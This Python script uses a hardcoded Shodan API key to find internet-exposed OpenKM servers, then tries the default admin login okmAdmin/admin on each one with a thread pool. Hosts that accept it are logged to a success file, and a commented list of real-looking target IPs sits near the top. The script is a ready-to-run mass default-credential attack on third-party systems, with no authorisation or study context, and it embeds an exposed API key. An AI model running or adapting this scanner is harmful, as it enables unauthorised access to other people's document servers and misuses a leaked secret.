#!/usr/bin/env python
# coding=utf-8
import logging
import threadpool
import requests
import threading
import shodan

SHODAN_API_KEY = 'wKVILEwGhBalnpICFKwCzBblwLmYJe9R'
# computers = [{"host":"52.67.13.69:8080","country":"Mexico"},
# 			{"host":"187.188.142.132:8090","country":"Mexico"},
# 			{"host":"200.186.58.2:8080","country":"Brazil"},
# 			{"host":"188.217.105.208:80","country":"Italy"},
# 			{"host":"60.248.3.122:8888","country":"Taiwan"}]
summary = {'total':0,'success':0,'fail':0,'success_list':[],'fail_list':[]}

mutex = threading.Lock()

def main():
	shodan_results = search_openkm(SHODAN_API_KEY)
	summary['total'] = shodan_results['total']
	global computers 
	computers = deal_results(shodan_results)
	print computers
	initPool()
	write_file(summary['success_list'],"success")
	write_file(summary['fail_list'],"fail")
	write_file(["success:",str(summary['success']),"+","fail:",str(summary["fail"]),"=",str(summary["total"])],"result")
	print str(summary['success']) + "/" + str(summary["total"]) 

def initPool():
	summary['total'] = len(computers)
	pool = threadpool.ThreadPool(2)
	reqs = threadpool.makeRequests(work,computers)
	[pool.putRequest(req) for req in reqs]
	pool.wait()

def work(computer):
	logging.info(computer)
	host = computer['host']
	country = computer['country']
	if check_login(host):
		deal_success(host,country)
	else:
		deal_fail(host,country)
	logging.debug(summary)
	logging.info(str(computer) + "finish")

def check_login(host):
	login_url = '/OpenKM/j_spring_security_check'
	url = 'http://' + host + login_url
	data ={
		'j_username':'okmAdmin',
	 	'j_password':'admin',
	 	'submit':'登录'
	}
	try:
		test_session = requests.Session()
		response = test_session.post(url=url,params=data,timeout=5)
		if response.url.find("index.jsp") == -1:
			logging.info(host + ' login fail')
			return False
		else:
			logging.info(host + ' login success')
			return True
	except Exception as e:
		logging.error(e)
		return False

def deal_success(host,country):
	if mutex.acquire():
		summary['success_list'].append(host + ' ' + country +'\n')
		summary['success'] += 1
		mutex.release()

def deal_fail(host,country):
	if mutex.acquire():
		summary['fail_list'].append(host+ ' ' + country +'\n')
		summary['fail'] += 1
        mutex.release()

def write_file(list,file_name):
	logging.info("write list :" + file_name)
	file = open(file_name + '.txt','w+')
	try:
		file.writelines(list)
	except Exception as e:
		logging.debug(e)
	finally:
		file.close()

def search_openkm(API_KEY):
	logging.info("api key:" + API_KEY)
	api = shodan.Shodan(API_KEY)
	results = api.search("openkm")
	logging.debug(results)
	logging.info(results['total'])
	total = results['total']
	logging.info("search finish!")
#	return iplist
	return results

def deal_results(shodan_results):
	results = []
	for item in shodan_results['matches']: 
		logging.debug(item)
		url_str = str(item['ip_str']) + ':' + str(item['port'])
		country_str = item['location']['country_name']
		logging.info(url_str + '  ' + country_str)
		results.append({'host':url_str,'country':country_str})
	logging.debug(results)
	return results

if __name__ == '__main__':
	log_file = "./test_pool.log"
	logging.basicConfig(filename = log_file, level = logging.DEBUG)
	logging.info("mission start")
	main()
	logging.info("mission finish")

